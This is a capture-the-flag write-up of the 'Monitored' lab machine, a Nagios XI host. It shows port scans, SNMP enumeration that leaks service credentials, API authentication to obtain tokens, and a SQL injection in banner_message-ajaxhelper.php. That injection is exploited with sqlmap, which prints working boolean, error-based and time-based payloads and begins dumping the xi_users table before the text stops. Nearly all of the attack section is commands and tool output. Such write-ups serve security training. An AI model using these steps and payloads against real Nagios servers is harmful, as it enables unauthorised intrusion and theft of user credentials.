# Monitored

## Reconnaissance

### Nmap

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.15.95
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-13 19:07 UTC
Nmap scan report for 10.129.15.95
Host is up (0.084s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
80/tcp  open  http     Apache httpd 2.4.56
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
443/tcp open  ssl/http Apache httpd 2.4.56 ((Debian))
|_http-title: Nagios XI
|_http-server-header: Apache/2.4.56 (Debian)
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
| Not valid before: 2023-11-11T21:46:55
|_Not valid after:  2297-08-25T21:46:55
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.83 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -sC -sV -p- 10.129.15.95
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-13 19:08 UTC
Nmap scan report for 10.129.15.95
Host is up (0.10s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
80/tcp   open  http       Apache httpd 2.4.56
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
|_http-server-header: Apache/2.4.56 (Debian)
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
| Not valid before: 2023-11-11T21:46:55
|_Not valid after:  2297-08-25T21:46:55
|_http-title: Nagios XI
|_ssl-date: TLS randomness does not represent time
5667/tcp open  tcpwrapped
Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.51 seconds
```

port 5667 -> NSCA (Nagios Service Check Acceptor)

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -sV -sU 10.129.15.95
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-13 19:10 UTC
Nmap scan report for monitored.htb (10.129.15.95)
Host is up (0.031s latency).
Not shown: 996 closed udp ports (port-unreach)
PORT    STATE         SERVICE VERSION
68/udp  open|filtered dhcpc
123/udp open          ntp     NTP v4 (unsynchronized)
161/udp open          snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
162/udp open          snmp    net-snmp; net-snmp SNMPv3 server
Service Info: Host: monitored

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1141.63 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.15.95    monitored.htb
10.129.15.95    nagios.monitored.htb
```

### Enumeration of Port 443/TCP

> https://10.129.15.95/

```c
┌──(user㉿kali)-[~]
└─$ whatweb https://10.129.15.95/
https://10.129.15.95/ [200 OK] Apache[2.4.56], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.56 (Debian)], IP[10.129.15.95], JQuery[3.6.0], Script[text/javascript], Title[Nagios XI]
```
### ldapsearch

```c
┌──(user㉿kali)-[~]
└─$ ldapsearch -H ldap://10.129.15.95 -x -s base -b '' "(objectClass=*)" "*" +
# extended LDIF
#
# LDAPv3
# base <> with scope baseObject
# filter: (objectClass=*)
# requesting: * + 
#

#
dn:
objectClass: top
objectClass: OpenLDAProotDSE
structuralObjectClass: OpenLDAProotDSE
configContext: cn=config
namingContexts: dc=monitored,dc=htb
supportedControl: 2.16.840.1.113730.3.4.18
supportedControl: 2.16.840.1.113730.3.4.2
supportedControl: 1.3.6.1.4.1.4203.1.10.1
supportedControl: 1.3.6.1.1.22
supportedControl: 1.2.840.113556.1.4.319
supportedControl: 1.2.826.0.1.3344810.2.3
supportedControl: 1.3.6.1.1.13.2
supportedControl: 1.3.6.1.1.13.1
supportedControl: 1.3.6.1.1.12
supportedExtension: 1.3.6.1.4.1.4203.1.11.1
supportedExtension: 1.3.6.1.4.1.4203.1.11.3
supportedExtension: 1.3.6.1.1.8
supportedFeatures: 1.3.6.1.1.14
supportedFeatures: 1.3.6.1.4.1.4203.1.5.1
supportedFeatures: 1.3.6.1.4.1.4203.1.5.2
supportedFeatures: 1.3.6.1.4.1.4203.1.5.3
supportedFeatures: 1.3.6.1.4.1.4203.1.5.4
supportedFeatures: 1.3.6.1.4.1.4203.1.5.5
supportedLDAPVersion: 3
supportedSASLMechanisms: DIGEST-MD5
supportedSASLMechanisms: NTLM
supportedSASLMechanisms: CRAM-MD5
entryDN:
subschemaSubentry: cn=Subschema

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

```c
┌──(user㉿kali)-[~]
└─$ ldapsearch -x -H ldap://10.129.15.95 -D '' -w '' -b "DC=monitored,DC=htb"
# extended LDIF
#
# LDAPv3
# base <DC=monitored,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# monitored.htb
dn: dc=monitored,dc=htb
objectClass: top
objectClass: dcObject
objectClass: organization
o: monitored.htb
dc: monitored

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

### snmpwalk

```c
┌──(user㉿kali)-[~]
└─$ snmpwalk -c public -v1 10.129.15.95
SNMPv2-MIB::sysDescr.0 = STRING: Linux monitored 5.10.0-27-amd64 #1 SMP Debian 5.10.205-2 (2023-12-31) x86_64
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (130861) 0:21:48.61
SNMPv2-MIB::sysContact.0 = STRING: Me <root@monitored.htb>
SNMPv2-MIB::sysName.0 = STRING: monitored
SNMPv2-MIB::sysLocation.0 = STRING: Sitting on the Dock of the Bay
SNMPv2-MIB::sysServices.0 = INTEGER: 72
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (296) 0:00:02.96
SNMPv2-MIB::sysORID.1 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.2 = OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.3 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.7 = OID: UDP-MIB::udpMIB
SNMPv2-MIB::sysORID.8 = OID: IP-MIB::ip
SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
SNMPv2-MIB::sysORID.11 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
<--- SNIP --->
HOST-RESOURCES-MIB::hrSWRunParameters.573 = STRING: "-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB "
<--- SNIP --->
HOST-RESOURCES-MIB::hrSWRunParameters.885 = STRING: "-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit"
HOST-RESOURCES-MIB::hrSWRunParameters.886 = STRING: "-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit"
<--- SNIP --->
HOST-RESOURCES-MIB::hrSWRunParameters.887 = STRING: "-h ldap:/// ldapi:/// -g openldap -u openldap -F /etc/ldap/slapd.d"
<--- SNIP --->
```

### Login on Nagios

#### Directory Busting with dirsearch

```c
┌──(user㉿kali)-[~]
└─$ dirsearch -u https://nagios.monitored.htb/nagiosxi/

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/user/reports/https_nagios.monitored.htb/_nagiosxi__24-01-13_20-16-10.txt

Target: https://nagios.monitored.htb/

[20:16:10] Starting: nagiosxi/
[20:16:14] 403 -  286B  - /nagiosxi/.ht_wsr.txt                             
[20:16:14] 403 -  286B  - /nagiosxi/.htaccess.bak1                          
[20:16:14] 403 -  286B  - /nagiosxi/.htaccess.orig                          
[20:16:14] 403 -  286B  - /nagiosxi/.htaccess.save
[20:16:14] 403 -  286B  - /nagiosxi/.htaccess.sample
[20:16:14] 403 -  286B  - /nagiosxi/.htaccess_extra                         
[20:16:14] 403 -  286B  - /nagiosxi/.htaccess_orig                          
[20:16:14] 403 -  286B  - /nagiosxi/.htaccess_sc
[20:16:14] 403 -  286B  - /nagiosxi/.htaccessBAK
[20:16:14] 403 -  286B  - /nagiosxi/.htaccessOLD
[20:16:14] 403 -  286B  - /nagiosxi/.htaccessOLD2
[20:16:14] 403 -  286B  - /nagiosxi/.htm                                    
[20:16:14] 403 -  286B  - /nagiosxi/.html                                   
[20:16:14] 403 -  286B  - /nagiosxi/.htpasswd_test                          
[20:16:14] 403 -  286B  - /nagiosxi/.htpasswds
[20:16:14] 403 -  286B  - /nagiosxi/.httr-oauth
[20:16:15] 403 -  286B  - /nagiosxi/.php                                    
[20:16:19] 301 -  339B  - /nagiosxi/about  ->  https://nagios.monitored.htb/nagiosxi/about/
[20:16:19] 301 -  341B  - /nagiosxi/account  ->  https://nagios.monitored.htb/nagiosxi/account/
[20:16:19] 302 -   27B  - /nagiosxi/account/  ->  https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/account/index.php%3f&noauth=1
[20:16:20] 301 -  339B  - /nagiosxi/admin  ->  https://nagios.monitored.htb/nagiosxi/admin/
[20:16:21] 302 -   27B  - /nagiosxi/admin/  ->  https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/admin/index.php%3f&noauth=1
[20:16:21] 302 -   27B  - /nagiosxi/admin/index.php  ->  https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/admin/index.php%3f&noauth=1
[20:16:26] 301 -  337B  - /nagiosxi/api  ->  https://nagios.monitored.htb/nagiosxi/api/
[20:16:26] 403 -  286B  - /nagiosxi/api/                                    
[20:16:27] 301 -  340B  - /nagiosxi/api/v1  ->  https://nagios.monitored.htb/nagiosxi/api/v1/
[20:16:27] 200 -   32B  - /nagiosxi/api/v1/swagger.yaml                     
[20:16:27] 200 -   32B  - /nagiosxi/api/v1/swagger.json
[20:16:27] 200 -   32B  - /nagiosxi/api/v1/
[20:16:28] 200 -  104B  - /nagiosxi/backend/                                
[20:16:31] 301 -  340B  - /nagiosxi/config  ->  https://nagios.monitored.htb/nagiosxi/config/
[20:16:31] 200 -    0B  - /nagiosxi/config.inc.php                          
[20:16:31] 302 -   27B  - /nagiosxi/config/  ->  https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/config/index.php%3f&noauth=1
[20:16:33] 301 -  336B  - /nagiosxi/db  ->  https://nagios.monitored.htb/nagiosxi/db/
[20:16:33] 403 -  286B  - /nagiosxi/db/                                     
[20:16:39] 301 -  338B  - /nagiosxi/help  ->  https://nagios.monitored.htb/nagiosxi/help/
[20:16:39] 302 -   27B  - /nagiosxi/help/  ->  https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/help/index.php%3f&noauth=1
[20:16:39] 301 -  340B  - /nagiosxi/images  ->  https://nagios.monitored.htb/nagiosxi/images/
[20:16:39] 403 -  286B  - /nagiosxi/images/                                 
[20:16:40] 301 -  342B  - /nagiosxi/includes  ->  https://nagios.monitored.htb/nagiosxi/includes/
[20:16:40] 403 -  286B  - /nagiosxi/includes/                               
[20:16:40] 302 -   27B  - /nagiosxi/index.php  ->  https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/index.php%3f&noauth=1
[20:16:40] 302 -   27B  - /nagiosxi/index.php/login/  ->  https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/index.php/login/%3f&noauth=1
[20:16:40] 302 -    0B  - /nagiosxi/install.php  ->  https://nagios.monitored.htb/nagiosxi/
[20:16:40] 302 -    0B  - /nagiosxi/install.php?profile=default  ->  https://nagios.monitored.htb/nagiosxi/
[20:16:43] 200 -    6KB - /nagiosxi/login.php                               
[20:16:46] 301 -  340B  - /nagiosxi/mobile  ->  https://nagios.monitored.htb/nagiosxi/mobile/
[20:16:55] 301 -  341B  - /nagiosxi/reports  ->  https://nagios.monitored.htb/nagiosxi/reports/
[20:17:03] 301 -  339B  - /nagiosxi/tools  ->  https://nagios.monitored.htb/nagiosxi/tools/
[20:17:03] 302 -   27B  - /nagiosxi/tools/  ->  https://nagios.monitored.htb/nagiosxi/login.php?redirect=/nagiosxi/tools/index.php%3f&noauth=1
[20:17:04] 302 -    0B  - /nagiosxi/upgrade.php  ->  index.php              
[20:17:06] 301 -  339B  - /nagiosxi/views  ->  https://nagios.monitored.htb/nagiosxi/views/
                                                                             
Task Completed
```

> https://nagios.monitored.htb/nagios/

| Username | Password |
| --- | --- |
| svc | XjH7VCehowpR1xZB |

- Version 4.4.13

#### More Directory Busting with Gobuster

```c
┌──(user㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u https://nagios.monitored.htb/nagiosxi/ -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://nagios.monitored.htb/nagiosxi/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 340] [--> https://nagios.monitored.htb/nagiosxi/images/]
/about                (Status: 301) [Size: 339] [--> https://nagios.monitored.htb/nagiosxi/about/]
/help                 (Status: 301) [Size: 338] [--> https://nagios.monitored.htb/nagiosxi/help/]
/tools                (Status: 301) [Size: 339] [--> https://nagios.monitored.htb/nagiosxi/tools/]
/mobile               (Status: 301) [Size: 340] [--> https://nagios.monitored.htb/nagiosxi/mobile/]
/admin                (Status: 301) [Size: 339] [--> https://nagios.monitored.htb/nagiosxi/admin/]
/reports              (Status: 301) [Size: 341] [--> https://nagios.monitored.htb/nagiosxi/reports/]
/account              (Status: 301) [Size: 341] [--> https://nagios.monitored.htb/nagiosxi/account/]
/includes             (Status: 301) [Size: 342] [--> https://nagios.monitored.htb/nagiosxi/includes/]
/backend              (Status: 301) [Size: 341] [--> https://nagios.monitored.htb/nagiosxi/backend/]
/db                   (Status: 301) [Size: 336] [--> https://nagios.monitored.htb/nagiosxi/db/]
/api                  (Status: 301) [Size: 337] [--> https://nagios.monitored.htb/nagiosxi/api/]
/config               (Status: 301) [Size: 340] [--> https://nagios.monitored.htb/nagiosxi/config/]
/views                (Status: 301) [Size: 339] [--> https://nagios.monitored.htb/nagiosxi/views/]
/sounds               (Status: 403) [Size: 286]
/terminal             (Status: 200) [Size: 5215]
/dashboards           (Status: 301) [Size: 344] [--> https://nagios.monitored.htb/nagiosxi/dashboards/]
Progress: 207643 / 207644 (100.00%)
===============================================================
Finished
===============================================================
```

> https://nagios.monitored.htb/nagiosxi/terminal/

> https://nagios.monitored.htb/nagios/cgi-bin/config.cgi?type=commands&expand=

```c
check_xi_service_status 	sudo /usr/local/nagiosxi/scripts/manage_services.sh status $ARG1$
```

## Termpering with Nagios

> https://research.nccgroup.com/2023/12/13/technical-advisory-multiple-vulnerabilities-in-nagios-xi/

> https://grimmcyber.com/escalating-xss-to-sainthood-with-nagios/

```c
┌──(user㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -u "https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ" --fs 32

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 32
________________________________________________

license                 [Status: 200, Size: 34, Words: 3, Lines: 2, Duration: 456ms]
authenticate            [Status: 200, Size: 53, Words: 7, Lines: 2, Duration: 731ms]
:: Progress: [38267/38267] :: Job [1/1] :: 28 req/sec :: Duration: [0:23:55] :: Errors: 2 ::
```

```c
┌──(user㉿kali)-[~]
└─$ curl -X POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -k -d 'username=svc&password=XjH7VCehowpR1xZB'
{"username":"svc","user_id":"2","auth_token":"2411d26d04762593d0f98e032f06778f173882b5","valid_min":5,"valid_until":"Sat, 13 Jan 2024 16:36:37 -0500"}
```

```c
https://10.129.15.95/nagiosxi/login.php?token=54f62a73c5ff55d2ad435a6a283c4ad715e64dad
```

```c
https://10.129.15.95/nagiosxi/account/
```

| API Key |
| --- |
| 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK |

## Privilege Escalation via SQL Injection

> https://outpost24.com/blog/nagios-xi-vulnerabilities/

```c
POST /nagiosxi/admin/banner_message-ajaxhelper.php HTTP/1.1
Host: nagios.monitored.htb
Cookie: nagiosxi=58bs01q8m46lr6imlvqdk549tc
Cache-Control: max-age=0
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.199 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

action=acknowledge_banner_message&id=3'
```

```c
┌──(user㉿kali)-[~]
└─$ sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --cookie="nagiosxi=a5mfui2itl8dt1iu52kgesm3c2" --data="action=acknowledge_banner_message&id=3" --dbms mariadb --batch
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.12#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:48:24 /2024-01-13/

[22:48:25] [INFO] testing connection to the target URL
[22:48:25] [INFO] checking if the target is protected by some kind of WAF/IPS
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
[22:48:26] [INFO] testing if the target URL content is stable
[22:48:26] [INFO] target URL content is stable
[22:48:26] [INFO] testing if POST parameter 'action' is dynamic
[22:48:27] [INFO] POST parameter 'action' appears to be dynamic
[22:48:27] [WARNING] heuristic (basic) test shows that POST parameter 'action' might not be injectable
[22:48:28] [INFO] testing for SQL injection on POST parameter 'action'
[22:48:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[22:48:32] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[22:48:33] [INFO] testing 'Generic inline queries'
[22:48:33] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[22:48:35] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[22:48:35] [WARNING] time-based comparison requires larger statistical model, please wait......... (done)                                                                                                                                  
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[22:48:42] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[22:48:44] [WARNING] POST parameter 'action' does not seem to be injectable
[22:48:44] [INFO] testing if POST parameter 'id' is dynamic
[22:48:44] [WARNING] POST parameter 'id' does not appear to be dynamic
[22:48:44] [INFO] heuristic (basic) test shows that POST parameter 'id' might be injectable (possible DBMS: 'MySQL')
[22:48:45] [INFO] heuristic (XSS) test shows that POST parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[22:48:45] [INFO] testing for SQL injection on POST parameter 'id'
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[22:48:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[22:48:45] [WARNING] reflective value(s) found and filtering out
[22:48:50] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[22:48:51] [INFO] POST parameter 'id' appears to be 'Boolean-based blind - Parameter replace (original value)' injectable (with --not-string="row")
[22:48:51] [INFO] testing 'Generic inline queries'
[22:48:52] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[22:48:52] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[22:48:53] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[22:48:53] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[22:48:54] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[22:48:54] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[22:48:55] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[22:48:55] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[22:48:56] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[22:48:56] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[22:48:57] [INFO] POST parameter 'id' is 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[22:48:57] [INFO] testing 'MySQL inline queries'
[22:48:57] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[22:48:58] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[22:48:58] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[22:48:59] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[22:48:59] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[22:49:00] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[22:49:00] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[22:49:12] [INFO] POST parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[22:49:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[22:49:12] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[22:49:12] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[22:49:12] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[22:49:13] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[22:49:22] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[22:49:32] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[22:49:40] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[22:49:50] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[22:50:00] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[22:50:09] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[22:50:18] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
POST parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 237 HTTP(s) requests:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: action=acknowledge_banner_message&id=(SELECT (CASE WHEN (2655=2655) THEN 3 ELSE (SELECT 2242 UNION SELECT 7096) END))

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: action=acknowledge_banner_message&id=3 OR (SELECT 9007 FROM(SELECT COUNT(*),CONCAT(0x7171707871,(SELECT (ELT(9007=9007,1))),0x7171716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=acknowledge_banner_message&id=3 AND (SELECT 4826 FROM (SELECT(SLEEP(5)))ycmC)
---
[22:50:27] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.56
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[22:50:30] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/nagios.monitored.htb'

[*] ending @ 22:50:30 /2024-01-13/
```

```c
┌──(user㉿kali)-[~]
└─$ sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php" --cookie="nagiosxi=a5mfui2itl8dt1iu52kgesm3c2" --data="action=acknowledge_banner_message&id=3" --dbms mariadb -T xi_users --dump
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[']_____ ___ ___  {1.7.12#stable}                                                                                                                                                                                                   
|_ -| . ["]     | .'| . |                                                                                                                                                                                                                   
|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:51:04 /2024-01-13/

[22:51:04] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (POST)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (original value)
    Payload: action=acknowledge_banner_message&id=(SELECT (CASE WHEN (2655=2655) THEN 3 ELSE (SELECT 2242 UNION SELECT 7096) END))

    Type: error-based
    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: action=acknowledge_banner_message&id=3 OR (SELECT 9007 FROM(SELECT COUNT(*),CONCAT(0x7171707871,(SELECT (ELT(9007=9007,1))),0x7171716a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: action=acknowledge_banner_message&id=3 AND (SELECT 4826 FROM (SELECT(SLEEP(5)))ycmC)
---
[22:51:04] [INFO] testing MySQL
you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y
[22:51:08] [INFO] confirming MySQL
